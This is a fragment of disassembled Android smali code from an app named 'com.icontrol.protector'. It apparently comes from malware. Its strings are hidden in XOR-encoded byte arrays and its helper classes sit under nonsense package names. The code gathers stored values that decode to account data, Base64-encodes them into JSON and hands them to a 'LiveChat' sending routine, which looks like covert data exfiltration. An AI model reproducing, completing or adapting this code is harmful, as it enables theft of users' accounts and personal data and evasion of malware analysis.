    fill-array-data v0, :array_0

    new-array v7, v6, [B

    fill-array-data v7, :array_1

    invoke-static {v0, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p2, v5, [B

    fill-array-data p2, :array_2

    new-array v0, v6, [B

    fill-array-data v0, :array_3

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p2, v2, [B

    fill-array-data p2, :array_4

    new-array v0, v6, [B

    fill-array-data v0, :array_5

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    new-array v0, v3, [B

    const/16 v1, 0x7e

    aput-byte v1, v0, v4

    new-array v1, v6, [B

    fill-array-data v1, :array_6

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, p2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {p1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    iget-object p2, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {p2, p1}, Lcom/icontrol/protector/LiveChat;->g(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    goto/16 :goto_2

    :cond_1
    new-array v0, v2, [B

    fill-array-data v0, :array_7

    new-array v7, v6, [B

    fill-array-data v7, :array_8

    invoke-static {v0, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    sget-object v0, Lcom/icontrol/protector/a;->h:Ljava/util/Map;

    invoke-interface {v0}, Ljava/util/Map;->values()Ljava/util/Collection;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Collection;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_1
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_2

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, Lntidisestablish/neumonoul/floccinaucinih/ab;->h:Ljava/lang/String;

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v7, v3, [B

    const/16 v9, -0x65

    aput-byte v9, v7, v4

    new-array v9, v6, [B

    fill-array-data v9, :array_9

    invoke-static {v7, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, Lntidisestablish/neumonoul/floccinaucinih/ab;->h:Ljava/lang/String;

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/16 v7, 0xd

    new-array v7, v7, [B

    fill-array-data v7, :array_a

    new-array v9, v6, [B

    fill-array-data v9, :array_b

    invoke-static {v7, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, Lntidisestablish/neumonoul/floccinaucinih/ab;->h:Ljava/lang/String;

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v7, v3, [B

    const/16 v9, 0x6d

    aput-byte v9, v7, v4

    new-array v9, v6, [B

    fill-array-data v9, :array_c

    invoke-static {v7, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-static {v1, v4}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->i:Ljava/lang/String;

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto :goto_1

    :cond_2
    :try_start_1
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    new-array v7, v5, [B

    fill-array-data v7, :array_d

    new-array v8, v6, [B

    fill-array-data v8, :array_e

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v7, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p2, v5, [B

    fill-array-data p2, :array_f

    new-array v7, v6, [B

    fill-array-data v7, :array_10

    invoke-static {p2, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v0, p2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p2, v2, [B

    fill-array-data p2, :array_11

    new-array v1, v6, [B

    fill-array-data v1, :array_12

    invoke-static {p2, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    new-array v1, v3, [B

    aput-byte v5, v1, v4

    new-array v2, v6, [B

    fill-array-data v2, :array_13

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, p2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p2

    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v0, p2}, Lcom/icontrol/protector/LiveChat;->g(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_3
    new-array p2, v6, [B

    fill-array-data p2, :array_14

    new-array v0, v6, [B

    fill-array-data v0, :array_15

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    const/16 v0, 0xe

    new-array v0, v0, [B

    fill-array-data v0, :array_16

    new-array v1, v6, [B

    fill-array-data v1, :array_17

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, p2, v0}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :catch_1
    :goto_2
    return-void

    :array_0
    .array-data 1
        0x79t
        -0xbt
        -0x4at
        -0x7t
    .end array-data

    :array_1
    .array-data 1
        0xdt
        -0x74t
        -0x3at
        -0x64t
        -0x60t
        0x33t
        0x70t
        -0x66t
    .end array-data

    :array_2
    .array-data 1
        0x5ct
        0x4t
        0x38t
        -0x67t
    .end array-data

    :array_3
    .array-data 1
        0x38t
        0x65t
        0x4ct
        -0x8t
        0x76t
        0x6ct
        0x33t
        0x3et
    .end array-data

    :array_4
    .array-data 1
        0x5et
        -0x14t
        -0x56t
    .end array-data

    :array_5
    .array-data 1
        0x3dt
        -0x67t
        -0x30t
        0x28t
        0x5ct
        -0x5dt
        0x34t
        -0xet
    .end array-data

    :array_6
    .array-data 1
        0xet
        0x3dt
        -0x16t
        -0x17t
        -0x8t
        -0x3t
        -0x7ft
        0x21t
    .end array-data

    :array_7
    .array-data 1
        0x3bt
        -0x24t
        -0x61t
    .end array-data

    :array_8
    .array-data 1
        0x4ft
        -0x52t
        -0xct
        -0x61t
        0x7ft
        0x14t
        0xbt
        0x52t
    .end array-data

    :array_9
    .array-data 1
        -0x4at
        0x77t
        -0x56t
        -0x7ft
        -0x12t
        0xbt
        -0x5ct
        -0xet
    .end array-data

    :array_a
    .array-data 1
        0x59t
        0x75t
        -0x79t
        0x5ft
        0x58t
        -0x22t
        -0x71t
        0x18t
        0x51t
        0x75t
        -0x2et
        0x75t
        0x5dt
    .end array-data

    nop

    :array_b
    .array-data 1
        0x17t
        0x1at
        -0x59t
        0x1bt
        0x39t
        -0x56t
        -0x12t
        0x38t
    .end array-data

    :array_c
    .array-data 1
        0x40t
        0x5et
        -0x55t
        -0x4et
        0x5et
        0x27t
        -0x36t
        0x1ft
    .end array-data

    :array_d
    .array-data 1
        0x76t
        -0xct
        0x32t
        -0x36t
    .end array-data

    :array_e
    .array-data 1
        0x2t
        -0x73t
        0x42t
        -0x51t
        -0x21t
        0x62t
        -0x3ct
        -0x37t
    .end array-data

    :array_f
    .array-data 1
        -0x70t
        -0x30t
        -0x2dt
        0x63t
    .end array-data

    :array_10
    .array-data 1
        -0xct
        -0x4ft
        -0x59t
        0x2t
        -0x9t
        -0x36t
        -0x50t
        0x71t
    .end array-data

    :array_11
    .array-data 1
        0x62t
        0x39t
        0xct
    .end array-data

    :array_12
    .array-data 1
        0x1t
        0x4ct
        0x76t
        -0x3dt
        -0x4bt
        -0x41t
        0x13t
        0x7ct
    .end array-data

    :array_13
    .array-data 1
        0x74t
        0x4ft
        -0x60t
        -0x7ft
        -0x69t
        -0x6et
        0x61t
        -0x65t
    .end array-data

    :array_14
    .array-data 1
        -0x14t
        -0x5ct
        -0x71t
        -0x70t
        -0x30t
        -0x6dt
        -0x3at
        0x69t
    .end array-data

    :array_15
    .array-data 1
        -0x53t
        -0x39t
        -0x14t
        -0x1t
        -0x5bt
        -0x3t
        -0x4et
        0x1at
    .end array-data

    :array_16
    .array-data 1
        -0x1dt
        0x12t
        -0x56t
        -0x25t
        -0x52t
        0x26t
        -0x14t
        0x7et
        -0x15t
        0x12t
        -0x1t
        -0xft
        -0x55t
        0x7ct
    .end array-data

    nop

    :array_17
    .array-data 1
        -0x53t
        0x7dt
        -0x76t
        -0x61t
        -0x31t
        0x52t
        -0x73t
        0x5et
    .end array-data
.end method
